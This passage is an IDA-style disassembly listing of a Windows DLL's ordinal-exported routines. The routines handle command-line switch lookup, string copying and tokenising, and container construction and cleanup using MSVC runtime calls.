loc_6AF3CA52:				; CODE XREF: Ordinal452+Aj
		cmp	esi, [edi+14h]
		jnz	short loc_6AF3CA33
		jmp	short loc_6AF3CA5C
; ---------------------------------------------------------------------------

loc_6AF3CA59:				; CODE XREF: Ordinal452+26j
		xor	ebx, ebx
		inc	ebx

loc_6AF3CA5C:				; CODE XREF: Ordinal452+30j
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		retn	8
Ordinal452	endp

; Exported entry 453.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal453
Ordinal453	proc near		; CODE XREF: Ordinal1074+346p
					; Ordinal1074+371p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	ebx
		push	esi
		xor	ebx, ebx
		xor	esi, esi
		cmp	[esp+8+arg_4], ebx
		push	edi
		mov	edi, ecx
		jle	short loc_6AF3CA95

loc_6AF3CA73:				; CODE XREF: Ordinal453+2Aj
		push	[esp+0Ch+arg_8]	; int
		mov	eax, [esp+10h+arg_0]
		push	dword ptr [eax+esi*4] ;	unsigned __int8	*
		mov	ecx, edi
		call	Ordinal452
		test	eax, eax
		jnz	short loc_6AF3CA92
		inc	esi
		cmp	esi, [esp+0Ch+arg_4]
		jl	short loc_6AF3CA73
		jmp	short loc_6AF3CA95
; ---------------------------------------------------------------------------

loc_6AF3CA92:				; CODE XREF: Ordinal453+23j
		xor	ebx, ebx
		inc	ebx

loc_6AF3CA95:				; CODE XREF: Ordinal453+Dj
					; Ordinal453+2Cj
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		retn	0Ch
Ordinal453	endp

; Exported entry 454.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal454(unsigned __int8 *)
		public Ordinal454
Ordinal454	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, [edi+10h]
		xor	ebx, ebx
		jmp	short loc_6AF3CAC4
; ---------------------------------------------------------------------------

loc_6AF3CAA9:				; CODE XREF: Ordinal454+2Aj
		mov	eax, [esi+8]
		push	[esp+0Ch+arg_0]	; unsigned __int8 *
		push	eax		; unsigned __int8 *
		call	ds:_mbsicmp
		test	eax, eax
		pop	ecx
		pop	ecx
		jnz	short loc_6AF3CAC1
		cmp	[esi], ebx
		jnz	short loc_6AF3CACB

loc_6AF3CAC1:				; CODE XREF: Ordinal454+1Ej
		add	esi, 10h

loc_6AF3CAC4:				; CODE XREF: Ordinal454+Aj
		cmp	esi, [edi+14h]
		jnz	short loc_6AF3CAA9
		jmp	short loc_6AF3CAE7
; ---------------------------------------------------------------------------

loc_6AF3CACB:				; CODE XREF: Ordinal454+22j
		add	esi, 10h
		cmp	esi, [edi+14h]
		jz	short loc_6AF3CADC
		cmp	[esi], ebx
		jnz	short loc_6AF3CADC
		mov	ebx, [esi+8]
		jmp	short loc_6AF3CAE7
; ---------------------------------------------------------------------------

loc_6AF3CADC:				; CODE XREF: Ordinal454+34j
					; Ordinal454+38j
		push	offset aCcommandlineGe ; "CCommandLine::Get(LPCTSTR) : pos->m_bSw"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF3CAE7:				; CODE XREF: Ordinal454+2Cj
					; Ordinal454+3Dj
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		retn	4
Ordinal454	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3CAEF	proc near		; CODE XREF: Ordinal457+81p
					; Ordinal460+EAp

arg_0		= byte ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_4]
		test	ecx, ecx
		jl	short loc_6AF3CB1A
		mov	eax, [esi]
		cmp	ecx, [eax-0Ch]
		jge	short loc_6AF3CB1A
		movzx	edx, [esp+4+arg_0]
		push	edx		; unsigned int
		add	eax, ecx
		push	eax		; unsigned __int8 *
		call	ds:_mbschr
		test	eax, eax
		pop	ecx
		pop	ecx
		jz	short loc_6AF3CB1A
		sub	eax, [esi]
		jmp	short loc_6AF3CB1D
; ---------------------------------------------------------------------------

loc_6AF3CB1A:				; CODE XREF: sub_6AF3CAEF+9j
					; sub_6AF3CAEF+10j ...
		or	eax, 0FFFFFFFFh

loc_6AF3CB1D:				; CODE XREF: sub_6AF3CAEF+29j
		pop	esi
		retn	8
sub_6AF3CAEF	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3CB21	proc near		; CODE XREF: Ordinal460+BDp

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		test	edx, edx
		jl	short loc_6AF3CB36
		mov	eax, [ecx]
		cmp	edx, [eax-0Ch]
		jg	short loc_6AF3CB36
		mov	al, [eax+edx]
		retn	4
; ---------------------------------------------------------------------------

loc_6AF3CB36:				; CODE XREF: sub_6AF3CB21+6j
					; sub_6AF3CB21+Dj
		push	80070057h
		call	sub_6AF3110D
sub_6AF3CB21	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


sub_6AF3CB41	proc near		; CODE XREF: Ordinal455+26p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	sub_6AF3C977
		mov	ecx, [esp+4+arg_0]
		cmp	eax, ecx
		ja	short loc_6AF3CB58
		mov	ecx, esi
		call	sub_6AF3C99D
; ---------------------------------------------------------------------------

loc_6AF3CB58:				; CODE XREF: sub_6AF3CB41+Ej
		shl	ecx, 4
		add	ecx, [esi+4]
		pop	esi
		mov	eax, ecx
		retn	4
sub_6AF3CB41	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF3CB64(void *Src,	size_t Size, int)
sub_6AF3CB64	proc near		; CODE XREF: sub_6AF3CC00+Fp

Src		= dword	ptr  4
Size		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		cmp	[esp+Src], 0
		push	esi
		push	edi
		mov	edi, [esp+8+Size]
		mov	esi, ecx
		jnz	short loc_6AF3CB81
		test	edi, edi
		jz	short loc_6AF3CB81
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF3CB81:				; CODE XREF: sub_6AF3CB64+Dj
					; sub_6AF3CB64+11j
		mov	ecx, [esp+8+arg_8]
		mov	eax, [ecx]
		push	1
		push	edi
		call	dword ptr [eax]
		test	eax, eax
		jnz	short loc_6AF3CB95
		call	sub_6AF31583
; ---------------------------------------------------------------------------

loc_6AF3CB95:				; CODE XREF: sub_6AF3CB64+2Aj
		add	eax, 10h
		push	edi
		mov	ecx, esi
		mov	[esi], eax
		call	sub_6AF3155D
		push	edi		; Size
		push	[esp+0Ch+Src]	; Src
		push	dword ptr [esi]	; Dst
		call	memcpy
		add	esp, 0Ch
		pop	edi
		mov	eax, esi
		pop	esi
		retn	0Ch
sub_6AF3CB64	endp

; Exported entry 455.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal455
Ordinal455	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		lea	esi, [ecx+0Ch]
		mov	ecx, esi
		call	sub_6AF3C977
		cmp	[esp+4+arg_0], eax
		jb	short loc_6AF3CBD8
		push	offset aCcommandline_0 ; "CCommandLine::Get(long) : nIndex >= m_C"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF3CBE8
; ---------------------------------------------------------------------------

loc_6AF3CBD8:				; CODE XREF: Ordinal455+Fj
		push	[esp+4+arg_0]
		mov	ecx, esi
		call	sub_6AF3CB41
		add	eax, 0Ch
		mov	eax, [eax]

loc_6AF3CBE8:				; CODE XREF: Ordinal455+1Ej
		pop	esi
		retn	4
Ordinal455	endp

; Exported entry 459.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal459
Ordinal459	proc near		; CODE XREF: sub_6AF3CF47+3Fp
					; sub_6AF3CFE5+3Fp ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+0Ch]
		call	sub_6AF3789B
		lea	ecx, [esi+8]
		pop	esi
		jmp	sub_6AF3789B
Ordinal459	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF3CC00(void *Src,	size_t Size, int)
sub_6AF3CC00	proc near		; CODE XREF: sub_6AF3CCD8+56p
					; sub_6AF3CD3D+33p

Src		= dword	ptr  4
Size		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	[esp+4+arg_8]	; int
		mov	esi, ecx
		push	[esp+8+Size]	; Size
		push	[esp+0Ch+Src]	; Src
		call	sub_6AF3CB64
		mov	eax, esi
		pop	esi
		retn	0Ch
sub_6AF3CC00	endp

; Exported entry 461.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal461
Ordinal461	proc near		; CODE XREF: sub_6AF3CC67+1Cp
					; sub_6AF3D245+1Ep
					; DATA XREF: ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_57 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	eax, [edi]
		mov	esi, ecx
		mov	[esi], eax
		mov	al, [edi+4]
		mov	[esi+4], al
		lea	eax, [edi+8]
		lea	ecx, [esi+8]
		push	eax
		mov	[ebp+var_10], esi
		call	sub_6AF316B7
		and	[ebp+var_4], 0
		add	edi, 0Ch
		push	edi
		lea	ecx, [esi+0Ch]
		call	sub_6AF316B7
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
Ordinal461	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CC67	proc near		; CODE XREF: sub_6AF3CF47+28p
					; sub_6AF3CFE5+28p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_58 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_10], ecx
		and	[ebp+var_4], 0
		test	ecx, ecx
		jz	short loc_6AF3CC88
		push	[ebp+arg_4]
		call	Ordinal461

loc_6AF3CC88:				; CODE XREF: sub_6AF3CC67+17j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		leave
		retn
sub_6AF3CC67	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CC94	proc near		; CODE XREF: sub_6AF3CD7E+28p
					; sub_6AF3CEAA+28p

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_58 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		mov	ecx, [ebp+arg_0]
		mov	[ebp+var_10], ecx
		and	[ebp+var_4], 0
		test	ecx, ecx
		jz	short loc_6AF3CCB5
		push	[ebp+arg_4]
		call	sub_6AF316B7

loc_6AF3CCB5:				; CODE XREF: sub_6AF3CC94+17j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		leave
		retn
sub_6AF3CC94	endp

; Exported entry 458.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal458
Ordinal458	proc near		; CODE XREF: Ordinal457+33p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+8]
		call	sub_6AF318C3
		lea	ecx, [esi+0Ch]
		call	sub_6AF318C3
		mov	eax, esi
		pop	esi
		retn
Ordinal458	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3CCD8(int, int, size_t Size)
sub_6AF3CCD8	proc near		; CODE XREF: sub_6AF3CDE8+75p
					; sub_6AF3CE87+17p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
Size		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		mov	ebx, [ebp+arg_4]
		test	ebx, ebx
		push	esi
		push	edi
		jge	short loc_6AF3CCEC
		xor	ebx, ebx

loc_6AF3CCEC:				; CODE XREF: sub_6AF3CCD8+10j
		mov	edi, [ebp+Size]
		test	edi, edi
		jge	short loc_6AF3CCF5
		xor	edi, edi

loc_6AF3CCF5:				; CODE XREF: sub_6AF3CCD8+19j
		mov	esi, [ecx]
		mov	eax, [esi-0Ch]
		lea	edx, [ebx+edi]
		cmp	edx, eax
		jle	short loc_6AF3CD05
		mov	edi, eax
		sub	edi, ebx

loc_6AF3CD05:				; CODE XREF: sub_6AF3CCD8+27j
		cmp	ebx, eax
		jle	short loc_6AF3CD0B
		xor	edi, edi

loc_6AF3CD0B:				; CODE XREF: sub_6AF3CCD8+2Fj
		test	ebx, ebx
		jnz	short loc_6AF3CD1E
		cmp	edi, eax
		jnz	short loc_6AF3CD1E
		push	ecx
		mov	ecx, [ebp+arg_0]
		call	sub_6AF316B7
		jmp	short loc_6AF3CD33
; ---------------------------------------------------------------------------

loc_6AF3CD1E:				; CODE XREF: sub_6AF3CCD8+35j
					; sub_6AF3CCD8+39j
		mov	ecx, [esi-10h]
		mov	eax, [ecx]
		call	dword ptr [eax+10h]
		mov	ecx, [ebp+arg_0]
		push	eax		; int
		push	edi		; Size
		add	esi, ebx
		push	esi		; Src
		call	sub_6AF3CC00

loc_6AF3CD33:				; CODE XREF: sub_6AF3CCD8+44j
		mov	eax, [ebp+arg_0]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
sub_6AF3CCD8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3CD3D(int, size_t Size)
sub_6AF3CD3D	proc near		; CODE XREF: Ordinal451+110p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Size		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		push	esi
		push	edi
		mov	edi, [ebp+Size]
		test	edi, edi
		jge	short loc_6AF3CD50
		xor	edi, edi

loc_6AF3CD50:				; CODE XREF: sub_6AF3CD3D+Fj
		mov	esi, [ecx]
		cmp	edi, [esi-0Ch]
		jl	short loc_6AF3CD62
		push	ecx
		mov	ecx, [ebp+arg_0]
		call	sub_6AF316B7
		jmp	short loc_6AF3CD75
; ---------------------------------------------------------------------------

loc_6AF3CD62:				; CODE XREF: sub_6AF3CD3D+18j
		mov	ecx, [esi-10h]
		mov	eax, [ecx]
		call	dword ptr [eax+10h]
		mov	ecx, [ebp+arg_0]
		push	eax		; int
		push	edi		; Size
		push	esi		; Src
		call	sub_6AF3CC00

loc_6AF3CD75:				; CODE XREF: sub_6AF3CD3D+23j
		mov	eax, [ebp+arg_0]
		pop	edi
		pop	esi
		leave
		retn	8
sub_6AF3CD3D	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CD7E	proc near		; CODE XREF: sub_6AF3CF2A+13p

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_59 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_8]
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_14], eax

loc_6AF3CD9D:				; CODE XREF: sub_6AF3CD7E+36j
		cmp	esi, [ebp+arg_4]
		jz	short loc_6AF3CDD6
		push	esi
		push	[ebp+arg_8]
		call	sub_6AF3CC94
		add	[ebp+arg_8], 4
		pop	ecx
		pop	ecx
		add	esi, 4
		jmp	short loc_6AF3CD9D
; ---------------------------------------------------------------------------

loc_6AF3CDB6:				; DATA XREF: .rdata:stru_6AF62BC4o
		mov	esi, [ebp+var_14]
		jmp	short loc_6AF3CDC8
; ---------------------------------------------------------------------------

loc_6AF3CDBB:				; CODE XREF: sub_6AF3CD7E+4Dj
		mov	ecx, [esi]
		sub	ecx, 10h
		call	sub_6AF3160D
		add	esi, 4

loc_6AF3CDC8:				; CODE XREF: sub_6AF3CD7E+3Bj
		cmp	esi, [ebp+arg_8]
		jnz	short loc_6AF3CDBB
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3CDD6:				; CODE XREF: sub_6AF3CD7E+22j
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
sub_6AF3CD7E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF3CDE8(int, unsigned __int8 *, int)
sub_6AF3CDE8	proc near		; CODE XREF: Ordinal460+4Cp

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		and	[ebp+var_8], 0
		push	esi
		mov	esi, [ebp+arg_8]
		mov	edx, [esi]
		test	edx, edx
		mov	[ebp+var_4], ecx
		jge	short loc_6AF3CE08
		push	80070057h
		call	sub_6AF3110D
; ---------------------------------------------------------------------------

loc_6AF3CE08:				; CODE XREF: sub_6AF3CDE8+14j
		cmp	[ebp+arg_4], 0
		jnz	short loc_6AF3CE19
		push	ecx
		mov	ecx, [ebp+arg_0]
		call	sub_6AF316B7
		jmp	short loc_6AF3CE7F
; ---------------------------------------------------------------------------

loc_6AF3CE19:				; CODE XREF: sub_6AF3CDE8+24j
		mov	eax, [ecx]
		push	ebx
		push	edi
		mov	edi, [eax-0Ch]
		lea	ebx, [eax+edx]
		add	edi, eax
		cmp	ebx, edi
		jnb	short loc_6AF3CE64
		push	[ebp+arg_4]	; unsigned __int8 *
		push	ebx		; unsigned __int8 *
		call	ds:_mbsspn
		add	ebx, eax
		cmp	ebx, edi
		pop	ecx
		pop	ecx
		mov	[ebp+arg_8], eax
		jnb	short loc_6AF3CE64
		push	[ebp+arg_4]	; unsigned __int8 *
		push	ebx		; unsigned __int8 *
		call	ds:_mbscspn
		pop	ecx
		pop	ecx
		mov	ecx, [esi]
		add	ecx, [ebp+arg_8]
		push	eax		; Size
		push	ecx		; int
		push	[ebp+arg_0]	; int
		lea	edx, [ecx+eax+1]
		mov	ecx, [ebp+var_4]
		mov	[esi], edx
		call	sub_6AF3CCD8
		jmp	short loc_6AF3CE7D
; ---------------------------------------------------------------------------

loc_6AF3CE64:				; CODE XREF: sub_6AF3CDE8+3Fj
					; sub_6AF3CDE8+54j
		or	dword ptr [esi], 0FFFFFFFFh
		mov	eax, [ebp+var_4]
		mov	eax, [eax]
		mov	ecx, [eax-10h]
		mov	eax, [ecx]
		call	dword ptr [eax+10h]
		mov	ecx, [ebp+arg_0]
		push	eax
		call	sub_6AF317F0

loc_6AF3CE7D:				; CODE XREF: sub_6AF3CDE8+7Aj
		pop	edi
		pop	ebx

loc_6AF3CE7F:				; CODE XREF: sub_6AF3CDE8+2Fj
		mov	eax, [ebp+arg_0]
		pop	esi
		leave
		retn	0Ch
sub_6AF3CDE8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CE87	proc near		; CODE XREF: Ordinal457+D1p
					; Ordinal451+E0p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, [ecx]
		mov	eax, [eax-0Ch]
		sub	eax, [ebp+arg_4]
		and	[ebp+var_4], 0
		push	eax		; Size
		push	[ebp+arg_4]	; int
		push	[ebp+arg_0]	; int
		call	sub_6AF3CCD8
		mov	eax, [ebp+arg_0]
		leave
		retn	8
sub_6AF3CE87	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CEAA	proc near		; CODE XREF: sub_6AF3CFAE+13p

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_60 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_0]
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_14], eax

loc_6AF3CEC6:				; CODE XREF: sub_6AF3CEAA+36j
		cmp	[ebp+arg_4], 0
		jbe	short loc_6AF3CF02
		push	[ebp+arg_8]
		push	[ebp+arg_0]
		call	sub_6AF3CC94
		dec	[ebp+arg_4]
		add	[ebp+arg_0], 4
		pop	ecx
		pop	ecx
		jmp	short loc_6AF3CEC6
; ---------------------------------------------------------------------------

loc_6AF3CEE2:				; DATA XREF: .rdata:stru_6AF62C14o
		mov	esi, [ebp+var_14]
		jmp	short loc_6AF3CEF4
; ---------------------------------------------------------------------------

loc_6AF3CEE7:				; CODE XREF: sub_6AF3CEAA+4Dj
		mov	ecx, [esi]
		sub	ecx, 10h
		call	sub_6AF3160D
		add	esi, 4

loc_6AF3CEF4:				; CODE XREF: sub_6AF3CEAA+3Bj
		cmp	esi, [ebp+arg_0]
		jnz	short loc_6AF3CEE7
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3CF02:				; CODE XREF: sub_6AF3CEAA+20j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
sub_6AF3CEAA	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3CF11	proc near		; CODE XREF: sub_6AF3CFCB+10p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF3CF22
; ---------------------------------------------------------------------------

loc_6AF3CF18:				; CODE XREF: sub_6AF3CF11+15j
		mov	ecx, esi
		call	sub_6AF3789B
		add	esi, 4

loc_6AF3CF22:				; CODE XREF: sub_6AF3CF11+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF3CF18
		pop	esi
		retn
sub_6AF3CF11	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CF2A	proc near		; CODE XREF: sub_6AF3D460+B1p
					; sub_6AF3D460+D7p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3CD7E
		add	esp, 14h
		leave
		retn
sub_6AF3CF2A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CF47	proc near		; CODE XREF: sub_6AF3D062+13p

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_61 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_8]
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_14], eax

loc_6AF3CF66:				; CODE XREF: sub_6AF3CF47+36j
		cmp	esi, [ebp+arg_4]
		jz	short loc_6AF3CF9C
		push	esi
		push	[ebp+arg_8]
		call	sub_6AF3CC67
		add	[ebp+arg_8], 10h
		pop	ecx
		pop	ecx
		add	esi, 10h
		jmp	short loc_6AF3CF66
; ---------------------------------------------------------------------------

loc_6AF3CF7F:				; DATA XREF: .rdata:stru_6AF62C64o
		mov	esi, [ebp+var_14]
		jmp	short loc_6AF3CF8E
; ---------------------------------------------------------------------------

loc_6AF3CF84:				; CODE XREF: sub_6AF3CF47+4Aj
		mov	ecx, esi
		call	Ordinal459
		add	esi, 10h

loc_6AF3CF8E:				; CODE XREF: sub_6AF3CF47+3Bj
		cmp	esi, [ebp+arg_8]
		jnz	short loc_6AF3CF84
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3CF9C:				; CODE XREF: sub_6AF3CF47+22j
		mov	ecx, [ebp+var_C]
		mov	eax, [ebp+arg_8]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
sub_6AF3CF47	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CFAE	proc near		; CODE XREF: sub_6AF3D07F+11p

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3CEAA
		add	esp, 14h
		leave
		retn
sub_6AF3CFAE	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CFCB	proc near		; CODE XREF: sub_6AF3D195+Fp
					; sub_6AF3D460+F4p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3CF11
		add	esp, 10h
		leave
		retn
sub_6AF3CFCB	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3CFE5	proc near		; CODE XREF: sub_6AF3D0A0+13p

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_62 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_0]
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_14], eax

loc_6AF3D001:				; CODE XREF: sub_6AF3CFE5+36j
		cmp	[ebp+arg_4], 0
		jbe	short loc_6AF3D03A
		push	[ebp+arg_8]
		push	[ebp+arg_0]
		call	sub_6AF3CC67
		dec	[ebp+arg_4]
		add	[ebp+arg_0], 10h
		pop	ecx
		pop	ecx
		jmp	short loc_6AF3D001
; ---------------------------------------------------------------------------

loc_6AF3D01D:				; DATA XREF: .rdata:stru_6AF62CB4o
		mov	esi, [ebp+var_14]
		jmp	short loc_6AF3D02C
; ---------------------------------------------------------------------------

loc_6AF3D022:				; CODE XREF: sub_6AF3CFE5+4Aj
		mov	ecx, esi
		call	Ordinal459
		add	esi, 10h

loc_6AF3D02C:				; CODE XREF: sub_6AF3CFE5+3Bj
		cmp	esi, [ebp+arg_0]
		jnz	short loc_6AF3D022
		push	0
		push	0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3D03A:				; CODE XREF: sub_6AF3CFE5+20j
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
sub_6AF3CFE5	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D049	proc near		; CODE XREF: sub_6AF3D0BD+10p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		mov	esi, [esp+4+arg_0]
		jmp	short loc_6AF3D05A
; ---------------------------------------------------------------------------

loc_6AF3D050:				; CODE XREF: sub_6AF3D049+15j
		mov	ecx, esi
		call	Ordinal459
		add	esi, 10h

loc_6AF3D05A:				; CODE XREF: sub_6AF3D049+5j
		cmp	esi, [esp+4+arg_4]
		jnz	short loc_6AF3D050
		pop	esi
		retn
sub_6AF3D049	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF3D062	proc near		; CODE XREF: sub_6AF3D245+B1p
					; sub_6AF3D245+D7p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF3CF47
		add	esp, 14h
		leave
		retn
sub_6AF3D062	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3D07F	proc near		; CODE XREF: sub_6AF3D460+C4p
					; sub_6AF3D460+17Ap ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_4]
		push	edi
		mov	edi, [esp+8+arg_0]
		push	ecx
		push	[esp+0Ch+arg_8]
		push	esi
		push	edi
		call	sub_6AF3CFAE
		add	esp, 10h
		lea	eax, [edi+esi*4]
		pop	edi
		pop	esi
		retn	0Ch
sub_6AF3D07F	endp


